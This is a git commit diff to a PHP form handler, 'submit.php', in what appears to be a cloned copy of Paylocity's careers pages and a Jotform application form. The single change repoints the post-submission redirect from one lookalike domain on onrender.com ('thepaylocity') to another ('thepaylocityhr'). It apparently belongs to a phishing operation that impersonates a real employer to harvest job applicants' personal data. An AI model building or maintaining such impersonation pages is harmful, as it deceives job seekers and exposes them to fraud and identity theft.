2b23941056c962294fcb0dc0afa166698d1a9e91
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2025-04-04 00:49:13 +0100

    Update submit.php

--- public/www.paylocity.com/careers/all-listings.job.34092/form.jotform.com/submit.php
+++ public/www.paylocity.com/careers/all-listings.job.34092/form.jotform.com/submit.php
@@ -174,7 +174,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-    header("Location:https://thepaylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
+    header("Location:https://thepaylocityhr.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
 exit;
 }
 ?>
